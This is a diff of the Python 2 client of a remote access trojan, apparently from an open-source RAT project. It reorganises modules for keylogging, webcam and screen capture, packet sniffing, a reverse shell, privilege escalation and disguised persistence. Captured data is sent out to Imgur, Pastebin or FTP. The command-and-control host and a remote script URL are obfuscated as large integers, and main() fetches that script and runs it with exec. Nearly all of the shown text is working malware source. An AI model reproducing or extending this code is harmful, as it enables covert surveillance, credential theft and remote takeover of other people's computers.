@@ -21,6 +21,7 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
+
 '''  
 
         ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
@@ -42,7 +43,7 @@
                      "Y8bbdP"    "Y8bbdP"  88
 
 '''
-
+from __future__ import print_function
 import os
 import sys
 import imp
@@ -75,7 +76,7 @@ class Client(object):
     __modules__ = {}
 
     def __init__(self, **kwargs):
-        self._setup(**kwargs)
+        self._setup     = [setattr(self, '__{}__'.format(chr(i)), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]; True
         self._exit      = 0
         self._threads   = {}
         self._info      = self._get_info()
@@ -83,71 +84,6 @@ class Client(object):
         self._modules   = {mod: getattr(self, mod) for mod in __modules__}
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result    = {mod: dict({}) for mod in self._modules}
-
-    def _long_to_bytes(self, x):
-        try:
-            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
-        except Exception as e:
-            self._print("Long-to-bytes conversion error: {}".format(str(e)))
-
-    def _bytes_to_long(self, x):
-        try:
-            return long(bytes(x).encode('hex'), 16)
-        except Exception as e:
-            self._print("Bytes-to-long conversion error: {}".format(str(e)))            
-
-    def _print(self, data):
-        if bool('__v__' in vars(self) and self.__v__):
-            print(data)
-
-    def _is_ipv4_address(self, address):
-        try:
-            if socket.inet_aton(str(address)):
-                return True
-        except:
-            return False
-
-    def _shutdown(self):
-        try:
-            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
-        except Exception as e:
-            self._print('Shutdown error: {}'.format(str(e)))
-
-    def _post(self, url, headers={}, data={}):
-        dat = urllib.urlencode(data)
-        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
-        for key, value in headers.items():
-            req.add_header(key, value)
-        return urllib2.urlopen(req).read()
-
-    def _png(self, image):
-        if type(image) == numpy.ndarray:
-            width, height = (image.shape[1], image.shape[0])
-            data = image.tobytes()
-        else:
-            width, height = (image.width, image.height)
-            data = image.rgb
-        line = width * 3
-        png_filter = struct.pack('>B', 0)
-        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
-        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
-        ihdr = [b'', b'IHDR', b'', b'']
-        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
-        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
-        ihdr[0] = struct.pack('>I', len(ihdr[2]))
-        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
-        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
-        idat[0] = struct.pack('>I', len(idat[2]))
-        iend = [b'', b'IEND', b'', b'']
-        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
-        iend[0] = struct.pack('>I', len(iend[2]))
-        fileh = cStringIO.StringIO()
-        fileh.write(magic)
-        fileh.write(b''.join(ihdr))
-        fileh.write(b''.join(idat))
-        fileh.write(b''.join(iend))
-        fileh.seek(0)
-        return fileh
 
     def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
@@ -157,20 +93,23 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options   = {'max_bytes': 1024, 'upload': 'pastebin'}
-            fx.window    = None
-            fx.buffer    = None
+            fx.window    = bytes()
+            fx.buffer    = cStringIO.StringIO()
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options   = {'image': True, 'video': bool(), 'upload': 'imgur'}
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options   = {'duration': 300.0, 'upload': 'ftp'}
@@ -178,12 +117,14 @@ class Client(object):
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
             fx.options   = {'upload': 'imgur'}
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
+                cx.update({fx.func_name: fx})
         elif fx.func_name is 'upload':
             fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
             fx.status.set()
@@ -255,11 +196,6 @@ class Client(object):
     def kill(self):
         """\tkill client and wipe"""
         return self._kill()
-    
-    @_command
-    def show(self, x):
-        """show client attributes"""
-        return self._show(x)
 
     @_command
     def wget(self, url):
@@ -285,6 +221,11 @@ class Client(object):
     def admin(self):
         """\tattempt to escalate privileges"""
         return self._admin()
+
+    @_command
+    def unzip(self, fp):
+        """\tunzip a compressed archive/file"""
+        return self._unzip(fp)
     
     @_command
     def upload(self, *args):
@@ -300,11 +241,6 @@ class Client(object):
     def options(self, x=None):
         """display module options"""
         return self._options(x) if x else self._options()
-
-    @_command
-    def stream(self, x):
-        """live stream client webcam"""
-        return self._webcam_stream(int(x)) if str(x).isdigit() else 'Error: invalid port number - {}'.format(x)
 
     @_command
     def status(self):
@@ -327,9 +263,9 @@ class Client(object):
         return self._help_modules()
 
     @_command
-    def webcam(self):
-        """\tcapture webcam - upload options: Imgur, FTP"""
-        return self._webcam()
+    def webcam(self, args=None):
+        """capture webcam - upload options: Imgur, FTP"""
+        return self._webcam(args)
     
     @_command
     def keylogger(self):
@@ -363,7 +299,6 @@ class Client(object):
     jobs.usage		= 'jobs'
     admin.usage		= 'admin'
     shell.usage		= 'shell'
-    webcam.usage	= 'webcam'
     status.usage	= 'status'
     results.usage       = 'results'
     standby.usage       = 'standby'
@@ -377,98 +312,133 @@ class Client(object):
     cd.usage		= 'cd <path>'
     new.usage		= 'new <url>'
     cat.usage		= 'cat <file>'
-    stream.usage        = 'stream <max>'
+    unzip.usage         = 'unzip <file>'
+    webcam.usage	= 'webcam <mode>'
     set.usage		= 'set <cmd> x=y'
     help.usage		= 'help <option>'
-    show.usage		= 'show <option>'
     disable.usage	= 'disable <cmd>'
     enable.usage	= 'enable <cmd>'
     upload.usage	= 'upload [file]'
     options.usage	= 'options <cmd>'
 
-    # ------------------- private functions -------------------------
+    # ------------------- utilities -------------------------
 
     def _wget(self, target): return urllib.urlretrieve(target)[0] if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
     
     def _cat(self, *path): return open(path[0]).read(4000) if os.path.isfile(path[0]) else 'Error: file not found'
-    
-    def _unzip(self, *path): return zipfile.ZipFile(*path).extractall('.') if os.path.isfile(path[0]) else 'Error: file not found'
-    
+        
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
-
-    def _pad(self, s): return s + (self.encryption.options['block_size'] - len(bytes(s)) % self.encryption.options['block_size']) * '\x00'
-
-    def _block(self, s): return [s[i * self.encryption.options['block_size']:((i + 1) * self.encryption.options['block_size'])] for i in range(len(s) // self.encryption.options['block_size'])]
-
-    def _xor(self, s, t): return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
 
     def _ls(self, path): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else '\n'.join(os.listdir('.'))
 
     def _results(self): return self._show({module:result for module,result in self._result.items() if len(result)})
   
-    def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
+    def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds\n'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
     def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
 
-    def _help(self, *arg): return ' \n USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
+    def _help(self, *arg): return ' USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()]) + '\n'
 
-    def _help_info(self): return '\n' + '\n'.join(['  {}\t{}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------'] + [' {}\t{}'.format(a,b) for a,b in self._get_info().items()])
+    def _help_info(self): return '\n'.join(['  {}\t{}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------'] + [' {}\t{}'.format(a,b) for a,b in self._get_info().items()]) + '\n'
 
-    def _help_jobs(self): return '\n' + '\n'.join(['  JOBS'] + [' -----------------------------------------------'] + [' {}{:>40}'.format(a, self._status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()])
+    def _help_jobs(self): return '\n'.join(['  JOBS'] + [' -----------------------------------------------'] + [' {}{:>40}'.format(a, self._status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()]) + '\n'
     
-    def _help_modules(self): return '\n' + '\n'.join(['  {}\t{}'.format('MODULE',' STATUS')] + [' -----------------------'] + [' {}\t{}'.format(mod, (' enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules if mod != 'webcam'] + [' {}\t\t{}'.format('webcam', (' enabled' if self._modules['webcam'].status.is_set() else 'disabled'))])
+    def _help_modules(self): return '\n'.join(['  {}\t{}'.format('MODULE',' STATUS')] + [' -----------------------'] + [' {}\t{}'.format(mod, (' enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules if mod != 'webcam'] + [' {}\t\t{}'.format('webcam', (' enabled' if self._modules['webcam'].status.is_set() else 'disabled'))]) + '\n'
 
-    def _setup(self, **kwargs):
-        for i in range(97,123):
-            if '__{}__'.format(chr(i)) in kwargs:
-                setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i))))
+    def _debug(self, data):
+        if bool('__v__' in vars(self) and self.__v__):
+            print(data)
 
-    def _screenshot(self):
-        with mss() as screen:
-            img = screen.grab(screen.monitors[0])
-        png = self._png(img)
-        opt = str(self.screenshot.options['upload']).lower()
-        result = getattr(self, '_upload_{}'.format(opt))(png) if opt in ('imgur','ftp') else self._upload_imgur(png)
-        self._result['screenshot'][time.ctime()] = result
-        return result
-
-    def _keylogger(self):
-        self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
-        self._threads['keylogger'].start()
-        return 'Keylogger running.'.format(time.ctime())
-
-    def _webcam(self):
-        if self.webcam.options['video']:
-            if 'video' not in self._result['webcam']:
-                self._result['webcam'].update({'video': {}})
-            result = self._webcam_video()
-            self._result['webcam']['video'][time.ctime()] = result
-        else:
-            if 'image' not in self._result['webcam']:
-                self._result['webcam'].update({'image': {}})
-            result = self._webcam_image()
-            self._result['webcam']['image'][time.ctime()] = result
-        return result
-
-    def _packetsniff(self):
+    def _long_to_bytes(self, x):
         try:
-            result = self._packetsniff_manager(float(self.packetsniff.options['duration']))
+            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
         except Exception as e:
-            result = 'Error monitoring network traffic: {}'.format(str(e))
-        self._result['packetsniff'].update({ time.ctime() : result })
+            self._connected.clear()
+
+    def _bytes_to_long(self, x):
+        try:
+            return long(bytes(x).encode('hex'), 16)
+        except Exception as e:
+            self._connected.clear()
+
+    def _pad(self, s):
+        try:
+            return s + (self.encryption.options['block_size'] - len(bytes(s)) % self.encryption.options['block_size']) * '\x00'
+        except Exception as e:
+            self._connected.clear()
+
+    def _block(self, s):
+        try:
+            return [s[i * self.encryption.options['block_size']:((i + 1) * self.encryption.options['block_size'])] for i in range(len(s) // self.encryption.options['block_size'])]
+        except Exception as e:
+            self._connected.clear()
+
+    def _xor(self, s, t):
+        try:
+            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+        except Exception as e:
+            self._connected.clear()
+
+    def _is_ipv4_address(self, address):
+        try:
+            if socket.inet_aton(str(address)):
+                return True
+        except:
+            return False
+
+    def _unzip(self, path):
+        if os.path.isfile(path):
+            try:
+                result = zipfile.ZipFile(path).extractall('.')
+            except Exception as e:
+                result = str(e)
+        else:
+            result = 'Error: file not found'
         return result
 
-    def _persistence(self):
-        result = {}
-        for method in self.persistence.options:
-            if method not in self._result['persistence']:
-                try:
-                    function = '_persistence_add_{}'.format(method)
-                    result[method] = getattr(self, function)()
-                except Exception as e:
-                    result[method] = str(e)
-        self._result['persistence'].update(result)
-        return result
+    def _shutdown(self):
+        try:
+            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
+        except Exception as e:
+            self._debug('Shutdown error: {}'.format(str(e)))
+
+    def _post(self, url, headers={}, data={}):
+        dat = urllib.urlencode(data)
+        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
+        for key, value in headers.items():
+            req.add_header(key, value)
+        return urllib2.urlopen(req).read()
+
+    def _png(self, image):
+        if type(image) == numpy.ndarray:
+            width, height = (image.shape[1], image.shape[0])
+            data = image.tobytes()
+        else:
+            width, height = (image.width, image.height)
+            data = image.rgb
+        line = width * 3
+        png_filter = struct.pack('>B', 0)
+        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
+        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+        ihdr = [b'', b'IHDR', b'', b'']
+        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+        ihdr[0] = struct.pack('>I', len(ihdr[2]))
+        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
+        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
+        idat[0] = struct.pack('>I', len(idat[2]))
+        iend = [b'', b'IEND', b'', b'']
+        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+        iend[0] = struct.pack('>I', len(iend[2]))
+        fileh = cStringIO.StringIO()
+        fileh.write(magic)
+        fileh.write(b''.join(ihdr))
+        fileh.write(b''.join(idat))
+        fileh.write(b''.join(iend))
+        fileh.seek(0)
+        return fileh
+
+    # ------------------- private functions -------------------------
 
     def _diffiehellman(self):
         try:
@@ -481,7 +451,6 @@ class Client(object):
             x  = pow(xB, a, p)
             return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
         except socket.error:
-            self._print('Diffie-Hellman transaction-less key exchange failed')
             self._connected.clear()
             return self._connect()
 
@@ -492,11 +461,12 @@ class Client(object):
             if self._is_ipv4_address(ip):
                 return _sock((ip, c))
             else:
-                self._print('Invalid IPv4 address\nRetrying in 5...'.format(_))
+                self._debug('Invalid IPv4 address\nRetrying in 5...'.format(_))
                 time.sleep(5)
                 return _addr(a, b, c)
         def _sock(addr):
             s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setblocking(True)
             s.connect(addr)
             return s
         try:
@@ -504,9 +474,9 @@ class Client(object):
             self._socket = _addr(self._long_to_bytes(long(self.__a__)), self._long_to_bytes(long(self.__b__)), int(port)) if 'debug' not in sys.argv else _sock(('localhost', int(port)))
             self._dhkey  = self._diffiehellman()
             return self._connected.set()
-        except Exception as e:
-            self._print('Connection error: {}'.format(str(e)))
-        self._print('Retrying in 5...')
+        except:
+            pass
+        self._debug('connection failed - retrying in 5...')
         time.sleep(5)
         return self._connect(port)
 
@@ -523,7 +493,7 @@ class Client(object):
                 return self._connected.clear()
             if len(data): return self._send(data, method)
         except Exception as e:
-            self._print('Send error: {}'.format(str(e)))
+            self._debug('Error sending data: {}'.format(str(e)))
 
     def _receive(self):
         try:
@@ -536,7 +506,7 @@ class Client(object):
             data = self._decrypt(data.rstrip()) if len(data) else data
             return data
         except Exception as e:
-            self._print('Receive error: {}'.format(str(e)))
+            self._debug('Error receiving data: {}'.format(str(e)))
 
     def _encryption(self, block):
         try:
@@ -550,7 +520,8 @@ class Client(object):
                 v1 = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
             return struct.pack(endian + "2L", v0, v1)
         except Exception as e:
-            self._print('Encryption error: {}'.format(str(e)))
+            self._debug('Encryption error: {}'.format(str(e)))
+            self._connected.clear()
 
     def _decryption(self, block):
         try:
@@ -565,7 +536,8 @@ class Client(object):
                 v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
             return struct.pack(endian + "2L", v0, v1)
         except Exception as e:
-            self._print('Decryption error: {}'.format(str(e)))
+            self._debug('Decryption error: {}'.format(str(e)))
+            self._connected.clear()
 
     def _encrypt(self, data):
         data    = self._pad(data)
@@ -645,7 +617,7 @@ class Client(object):
                 for key,val in self.encryption.options.items():
                     output.append('{:>30} {:>10}'.format(str(key), str(val)))
                 for target in [name for name,module in self._modules.items() if hasattr(module, 'options')]:
-                    output.append('\n {}'.format(target))
+                    output.append(target)
                     for option,value in getattr(self, target).options.items():
                         output.append('{:>30} {:>10}'.format(option, str(value)))
             else:
@@ -654,7 +626,7 @@ class Client(object):
                 elif not hasattr(getattr(self, target), 'options'):
                     return "No options found for '{}'".format(target)
                 else:
-                    output.append('\n {}'.format(target))
+                    output.append(target)
                     for option,value in getattr(self, target).options.items():
                         output.append('{:>30} {:>10}'.format(option, str(value)))
             return '\n'.join(output)
@@ -719,7 +691,7 @@ class Client(object):
             self._modules[name] = module
             return module
         except Exception as e:
-            self._print("Error creating module: {}".format(str(e)))
+            self._debug("Error creating module: {}".format(str(e)))
 
     def _hidden_process(self, path, shell=False):
         info = subprocess.STARTUPINFO()
@@ -739,7 +711,7 @@ class Client(object):
             results, _ = p.communicate()
             return results
         except Exception as e:
-            self._print('Powershell error: {}'.format(str(e)))
+            self._debug('Powershell error: {}'.format(str(e)))
 
     def _upload_imgur(self, source):
         if not self.upload.options['imgur'].get('api_key'):
@@ -792,9 +764,9 @@ class Client(object):
 
     def _upload(self, *args):
         if len(args) != 2:
-            return 'usage: upload <mode> <source>'
-        mode    = str(args[0])
+            return 'usage: upload <file> <mode>'
         source  = args[1]
+        mode    = args[0]
         if mode not in self.upload.options:
             return "Error: mode must be a valid upload option: {}".format(', '.join(["'{}'".format(i) for i in self.upload.options]))
         try:
@@ -811,15 +783,11 @@ class Client(object):
         return "Running: {}".format(', '.join(tasks))
 
     def _standby(self):
-        _ = self._threads.pop('shell', None)
-        del _
-        try:
-            self._socket.close()
-        except: pass
+        self._socket.close()
+        self._connected.clear()
         return self._connect()
 
     def _shell(self):
-        self.shell.status.set()
         self._threads['shell'] = threading.Thread(target=self._reverse_shell, name=time.time())
         self._threads['shell'].start()
 
@@ -828,7 +796,7 @@ class Client(object):
             if not self.shell.status.is_set():
                 break
             if self._connected.is_set():
-                prompt = "[%d @ {}]> ".format(os.getcwd())
+                prompt = "[{} @ %s]> " % os.getcwd()
                 self._send(prompt, method='prompt')   
                 data = self._receive()
                 if not data:
@@ -839,11 +807,6 @@ class Client(object):
                 else:
                     result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                 if result and len(result):
-                    if len(result) > 2000:
-                        method = 'binary'
-                    else:
-                        method = 'default'
-                    result = '\n' + str(result) + '\n'
                     self._send(result, method=cmd)
             else:
                 if 'connecting' not in self._threads:
@@ -868,7 +831,7 @@ class Client(object):
             self._threads['connecting'].start()
             self._threads['shell'].start()
         except Exception as e:
-            self._print("Error: '{}'".format(str(e)))
+            self._debug("Error: '{}'".format(str(e)))
 
     def _kill(self):
         try:
@@ -878,7 +841,7 @@ class Client(object):
                     target = 'persistence_remove_{}'.format(method)
                     getattr(self, target)()
                 except Exception as e2:
-                    self._print('Error removing persistence: {}'.format(str(e2)))
+                    self._debug('Error removing persistence: {}'.format(str(e2)))
             try:
                 self._socket.close()
             except: pass
@@ -898,7 +861,22 @@ class Client(object):
             shutdown.start()
             exit(0)
 
+    # ------------------- screenshot -------------------------
+
+    def _screenshot(self):
+        with mss() as screen:
+            img = screen.grab(screen.monitors[0])
+        png = self._png(img)
+        opt = str(self.screenshot.options['upload']).lower()
+        result = getattr(self, '_upload_{}'.format(opt))(png) if opt in ('imgur','ftp') else self._upload_imgur(png)
+        self._result['screenshot'][time.ctime()] = result
+        return result
+    
     # ------------------- keylogger -------------------------
+    def _keylogger(self):
+        self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
+        self._threads['keylogger'].start()
+        return 'Keylogger running.'.format(time.ctime())
 
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.window:
@@ -942,7 +920,7 @@ class Client(object):
                 if not self.keylogger.status.is_set():
                     break
             except Exception as e:
-                self._print("Keylogger helper function error: {}".format(str(e)))
+                self._debug("Keylogger helper function error: {}".format(str(e)))
                 break
                 
     def _keylogger_manager(self):
@@ -967,7 +945,39 @@ class Client(object):
                     
     # ------------------- webcam -------------------------
 
-    def _webcam_image(self):
+    def _webcam(self, args=None):
+        port = None
+        if not args:
+            if self.webcam.options['image']:
+                mode = 'image'
+            elif self.webcam.options['video']:
+                mode = 'video'
+            else:
+                return
+        else:
+            args = str(args).split()
+            mode = args[0].lower()
+            if 'image' in mode:
+                mode = 'image'
+            elif 'video' in mode:
+                mode = 'video'
+            elif 'stream' in mode:
+                mode = 'stream'
+                if len(args) != 2:
+                    return "Error - stream mode requires argument: 'port'"
+                port = args[1]
+            else:
+                return "Error - invalid mode '{}'. Valid options: 'image', 'video', 'stream'".format(mode)
+        if mode not in self._result['webcam']:
+            self._result['webcam'][mode] = {}
+        try:
+            result = getattr(self, '_webcam_{}'.format(mode))(port)
+        except Exception as e:
+            result = str(e)
+        self._result['webcam'][mode][time.ctime()] = result
+        return result
+
+    def _webcam_image(self, *args, **kwargs):
         opt = str(self.webcam.options['upload']).lower()
         if opt not in ('imgur','ftp'):
             return "Error: invalid upload option - '{}'\nValid upload options for webcam images: 'imgur','ftp'".format(opt)
@@ -1007,7 +1017,7 @@ class Client(object):
                     sock.sendall(struct.pack("L", len(data))+data)
                     time.sleep(0.1)
                 except Exception as e:
-                    self._print('Stream error: {}'.format(str(e)))
+                    self._debug('Stream error: {}'.format(str(e)))
                     break
         finally:
             dev.release()
@@ -1016,7 +1026,7 @@ class Client(object):
             dev.release()
         return 'Streaming complete'
 
-    def _webcam_video(self, duration=5.0):
+    def _webcam_video(self, duration=5.0, *args, **kwargs):
         if str(self.webcam.options['upload']).lower() == 'ftp':
             try:
                 fpath  = cStringIO.StringIO()
@@ -1036,7 +1046,15 @@ class Client(object):
             result = "Error: FTP upload is the only option for video captured from webcam"
         return result
 
-    # ------------------- packetsniff -------------------------
+    # ------------------- packetsniffer -------------------------
+
+    def _packetsniff(self):
+        try:
+            result = self._packetsniff_manager(float(self.packetsniff.options['duration']))
+        except Exception as e:
+            result = 'Error monitoring network traffic: {}'.format(str(e))
+        self._result['packetsniff'].update({ time.ctime() : result })
+        return result
 
     def _packetsniff_udp_header(self, data):
         try:
@@ -1179,6 +1197,18 @@ class Client(object):
         return result
 
     # ------------------- persistence -------------------------
+    
+    def _persistence(self):
+        result = {}
+        for method in self.persistence.options:
+            if method not in self._result['persistence']:
+                try:
+                    function = '_persistence_add_{}'.format(method)
+                    result[method] = getattr(self, function)()
+                except Exception as e:
+                    result[method] = str(e)
+        self._result['persistence'].update(result)
+        return result
 
     def _persistence_add_scheduled_task(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
@@ -1194,7 +1224,7 @@ class Client(object):
                     self._result['persistence']['scheduled_task'] = result
                     return True
             except Exception as e:
-                self._print('Add scheduled task error: {}'.format(str(e)))
+                self._debug('Add scheduled task error: {}'.format(str(e)))
         return False
 
     def _persistence_remove_scheduled_task(self, task_name='MicrosoftUpdateManager'):
@@ -1221,7 +1251,7 @@ class Client(object):
                 self._result['persistence']['startup_file'] = startup_file
                 return True
             except Exception as e:
-                self._print('Adding startup file error: {}'.format(str(e)))
+                self._debug('Adding startup file error: {}'.format(str(e)))
         return False
 
     def _persistence_remove_startup_file(self, task_name='MicrosoftUpdateManager'):
@@ -1251,7 +1281,7 @@ class Client(object):
                 CloseKey(reg_key)
                 return True
             except Exception as e:
-                self._print('Remove registry key error: {}'.format(str(e)))
+                self._debug('Remove registry key error: {}'.format(str(e)))
         return False
 
     def _persistence_remove_registry_key(self, task_name='MicrosoftUpdateManager'):
@@ -1283,7 +1313,7 @@ class Client(object):
                     self._result['persistence']['wmi_object'] = result
                     return True
         except Exception as e:
-            self._print('WMI persistence error: {}'.format(str(e)))        
+            self._debug('WMI persistence error: {}'.format(str(e)))        
         return False
 
     def _persistence_remove_wmi_object(self, task_name='MicrosoftUpdaterManager'):
@@ -1314,7 +1344,7 @@ class Client(object):
                     self._result['persistence']['hidden_file'] = self._long_to_bytes(long(self.__f__))
                     return True
             except Exception as e:
-                self._print('Adding hidden file error: {}'.format(str(e)))
+                self._debug('Adding hidden file error: {}'.format(str(e)))
         return False
 
     def _persistence_remove_hidden_file(self, *args, **kwargs):
@@ -1326,7 +1356,7 @@ class Client(object):
                     _ = self._result['persistence'].pop('hidden_file', None)
                     return True
             except Exception as e:
-                self._print('Error unhiding file: {}'.format(str(e)))
+                self._debug('Error unhiding file: {}'.format(str(e)))
         return False
 
     def _persistence_add_launch_agent(self, task_name='com.apple.update.manager'):
@@ -1348,7 +1378,7 @@ class Client(object):
                     self._result['persistence']['launch agent'] = launch_agent
                 return True
             except Exception as e2:
-                self._print('Error: {}'.format(str(e2)))
+                self._debug('Error: {}'.format(str(e2)))
         return False
 
     def _persistence_remove_launch_agent(self, *args, **kwargs):
@@ -1364,28 +1394,28 @@ class Client(object):
 
 
 def main(*args, **kwargs):
-    if '__w__' in kwargs:
-        exec 'import urllib' in globals()
-        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['__w__'])).strip('0x').strip('L')))).read()
+    if 'w' in kwargs:
+        exec "import urllib" in globals()
+        imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['w'])).strip('0x').strip('L')))).read()
         exec imports in globals()
-    if '__f__' not in kwargs and '__file__' in globals():
-        kwargs['__f__'] = bytes(long(globals()['__file__'].encode('hex'), 16))
+    if 'f' not in kwargs and '__file__' in globals():
+        kwargs['f'] = bytes(long(globals()['__file__'].encode('hex'), 16))
     return Client(**kwargs)._start()
 
 if __name__ == '__main__':
     m = main(**{
-            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "12620",
-            "__w__": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+            "a": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "c": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "b": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "d": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
